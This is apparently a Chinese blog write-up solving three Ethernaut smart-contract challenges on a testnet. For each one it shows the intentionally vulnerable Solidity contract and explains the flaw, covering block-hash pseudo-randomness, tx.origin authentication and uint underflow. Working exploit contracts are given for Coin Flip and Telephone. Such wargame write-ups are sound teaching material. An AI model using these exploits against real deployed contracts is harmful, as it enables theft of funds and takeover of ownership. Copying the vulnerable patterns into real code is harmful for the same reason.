# Ethernaut WP

## 前言

现在自己的solidity的基础语法和相关内容已经了解了，现在通过题目来加深一下以太坊合约漏洞的挖掘方式

## Coin Flip

首先点击 `Get new instance`实例化一个合约，对于我做时的场景

> Address: "0x4b7e814de0f82bd45e2f736a72f5762bf10e6361"
> Test Network: Ropsten

要求：
>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

### 源码分析

先去etherscan上将源码保存下来

```solidity
/**
 *Submitted for verification at Etherscan.io on 2018-05-16
*/

pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

分析一下源码

可以看到决定游戏胜利的条件是`consecutiveWins`的大小达到`10`，向下挖掘可以改变此值的位置，发现可以通过猜伪随机数的方式来实现增加。

在这里补充下 `block`的概念
>block.number(uint)：solidity中的一个EVM内置的全局变量，其内容是当前交易的区块高度
>block.blockhash(uint blocknumber)：返回给定区块的哈希值

可以看到题目中使用的是上一个区块的hash值，而上一个区块的hash值已经是一个确定的值了，因而可以通过模拟合约的行为来进行猜测

> 补充一个交易的详细信息来方便理解交易与区块的关系与概念

```text
Transaction Hash: x8c20b80588d14ddfc6cd3926a92aa17502b3cb021323bfbd438a8449a8c5e4ae
Status: Success
Block: 8038749
Timestamp: 1 hr 12 mins ago (Jun-06-2020 01:55:46 PM +UTC)
From: 0xa9af91b9567fbebbf95fc82c0c51a70deab10dc2
To: Contract 0xc833a73d33071725143d7cf7dfd4f4bba6b5ced2
Value: 0 Ether ($0.00)
Transaction Fee: 0.0006480639 Ether ($0.000000)
```

编写攻击合约

```solidity
contract exp {
    address con_addr = 0x4b7e814de0f82bd45e2f736a72f5762bf10e6361;
    CoinFlip c = CoinFlip(con_addr);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess() public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        c.flip(side);
    }

    function getFlag() public {
        for(uint i = 0; i < 10;i++) {
            guess();
        }
    }
}
```

利用`remix ide`将合约部署到测试网络上，十次之后即可通关

## Telephone

典型的 `tx.origin`与`msg.sender`的区别的问题，初始化实例后

> Address: 0x9450bcddcaa9ffc439732f08ebb90d033473ee3b
> Test Network: Ropsten

要求：
> Claim ownership of the contract below to complete this level.

### 源码分析

```solidity
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

可以看到只要使tx.origin与msg.sender不同即可

补充下相关内容
> tx.origin：交易的发起人，站在整个交易的顶点，只存在个人地址
> msg.sender：具体调用每一个方法的人，例如合约地址或者个人地址

所以可以看到只要另起合约即可使关系发生变化，即 tx.origin => 个人账户，msg.sender => 合约账号

编写攻击合约

```solidity
contract exp {
    address cont_addr = 0x9450bcddcaa9ffc439732f08ebb90d033473ee3b;
    Telephone t = Telephone(cont_addr);

    function change() public {
        t.changeOwner(tx.origin);
    }
}
```

将合约部署到测试网络上后即可实现owner的转换

## Token

考察uint的内容，初始化实例后

> Address:  0x6545df87f57d21cb096a0bfcc53a70464d062512
> Test Network: Ropsten

要求：

> Preferably a very large amount of tokens.

### 源码分析

```solidity
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

可以看到对于mapping类型的balances变量，其值的类型uint永大于0，因此transfer的限制基本就无用了，直接随意转一个超级大的数即可
